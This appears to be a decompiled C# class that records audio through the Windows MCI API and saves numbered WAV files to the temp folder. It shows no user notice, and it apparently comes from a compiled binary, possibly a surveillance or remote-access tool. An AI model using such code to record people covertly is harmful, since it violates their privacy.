using System;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;
using rec.My;

namespace rec
{
	// Token: 0x020000AE RID: 174
	public class rec
	{
		// Token: 0x06000392 RID: 914 RVA: 0x00014B1C File Offset: 0x00012D1C
		public rec()
		{
			this.i = 0;
		}

		// Token: 0x06000393 RID: 915
		[DllImport("winmm.dll", CharSet = CharSet.Ansi, EntryPoint = "mciSendStringA", ExactSpelling = true, SetLastError = true)]
		private static extern int mciSendString([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrCommand, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrReturnString, int uReturnLength, int hwndCallback);

		// Token: 0x06000394 RID: 916 RVA: 0x00014B30 File Offset: 0x00012D30
		public object startrec()
		{
			checked
			{
				while (MyProject.Computer.FileSystem.FileExists(Path.GetTempPath() + "soundrec" + Conversions.ToString(this.i) + ".wav"))
				{
					this.i++;
				}
				string text = "open new Type waveaudio Alias recsound";
				string text2 = "";
				rec.mciSendString(ref text, ref text2, 0, 0);
				text2 = "record recsound";
				text = "";
				rec.mciSendString(ref text2, ref text, 0, 0);
				object result;
				return result;
			}
		}

		// Token: 0x06000395 RID: 917 RVA: 0x00014BB8 File Offset: 0x00012DB8
		public object stoprec()
		{
			string text = string.Concat(new string[]
			{
				"save recsound ",
				Path.GetTempPath(),
				"soundrec",
				Conversions.ToString(this.i),
				".wav"
			});
			string text2 = "";
			rec.mciSendString(ref text, ref text2, 0, 0);
			text2 = "close recsound";
			text = "";
			rec.mciSendString(ref text2, ref text, 0, 0);
			object result;
			return result;
		}

		// Token: 0x040002C2 RID: 706
		public int i;
	}
}
